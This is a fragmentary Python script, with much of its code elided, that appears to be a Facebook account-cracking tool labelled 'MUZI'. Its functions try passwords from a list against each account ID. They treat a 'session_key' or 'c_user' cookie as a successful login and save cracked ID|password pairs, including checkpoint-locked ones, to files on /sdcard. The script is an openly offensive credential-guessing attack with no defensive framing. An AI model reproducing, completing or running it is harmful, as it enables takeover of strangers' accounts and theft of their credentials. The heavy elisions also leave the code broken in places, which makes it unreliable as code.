...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MUZI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MUZI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [MUZI-CP] '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [MUZI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MUZI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in TRT:
                                ...
                                print('\r\r\033[1;32m [MUZI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MUZI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
    ...
    'user-agent': pro}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MUZI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [MUZI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def trt2(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in q:
                                udx = str(q['uid'])
                                print('\r\r\033[1;32m [MUZI-OK] '+udx+' | '+pas+'\033[1;97m')
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                if uid in oks:pass
                                        ...
                                        if 'checkpoint' in str(lo):
                                                ...
                                                print(f'\r\x1b[1;32m [MUZI-OK] '+uid+' | '+pas)
                                ...
                                if uid in cps:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [MUZI-CP] '+uid+' | '+pas+'\033[1;97m')
